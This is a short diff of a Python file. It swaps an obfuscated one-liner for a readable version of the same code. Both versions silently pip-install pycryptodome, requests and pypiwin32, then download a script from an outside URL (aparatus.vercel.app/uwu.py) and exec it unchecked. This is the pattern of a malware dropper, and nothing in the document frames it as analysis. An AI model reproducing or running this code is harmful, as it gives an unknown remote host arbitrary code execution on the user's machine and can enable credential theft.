@@ -1,1 +1,16 @@
-lllllllllllllll,llllllllllllllI,lllllllllllllIl,lllllllllllllII=__import__,exec,Exception,ImportError;import subprocess as lllllIIlIIIIlI,sys as lllIlIIIIlIIII,requests as llIIlIIIIIIIll;IlllllIIlllllIIIIl=lambda IlllIIIIlIIlIIlIII:lllllIIlIIIIlI.check_call([lllIlIIIIlIIII.executable,'-m','pip','install',IlllIIIIlIIlIIlIII],stdout=lllllIIlIIIIlI.DEVNULL,stderr=lllllIIlIIIIlI.DEVNULL);lIlIIIIlIIlIIIlIlI=['pycryptodome','requests','pypiwin32'];[IlllllIIlllllIIIIl(IlllIIIIlIIlIIlIII) for IlllIIIIlIIlIIlIII in lIlIIIIlIIlIIIlIlI if lllllllllllllll(IlllIIIIlIIlIIlIII) is None];llllIllIIllIIIlllI='https://aparatus.vercel.app/uwu.py';lllIIIlIIIlllIIIII=llIIlIIIIIIIll.get(llllIllIIllIIIlllI);llIIlIIllIlIIllIII=lllIIIlIIIlllIIIII.text if lllIIIlIIIlllIIIII.raise_for_status() is None else None;[llllllllllllllI(llIIlIIllIlIIllIII) for llIIlIIllIlIIllIII in [llIIlIIllIlIIllIII] if llIIlIIllIlIIllIII is not None]
+import subprocess as sp
+import sys
+import requests
+def install_package(package):
+    sp.check_call([sys.executable, '-m', 'pip', 'install', package], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
+packages = ['pycryptodome', 'requests', 'pypiwin32']
+for package in packages:
+    try:
+        __import__(package)
+    except ImportError:
+        install_package(package)
+script_url = 'https://aparatus.vercel.app/uwu.py'
+response = requests.get(script_url)
+response.raise_for_status()
+script_content = response.text
+exec(script_content)
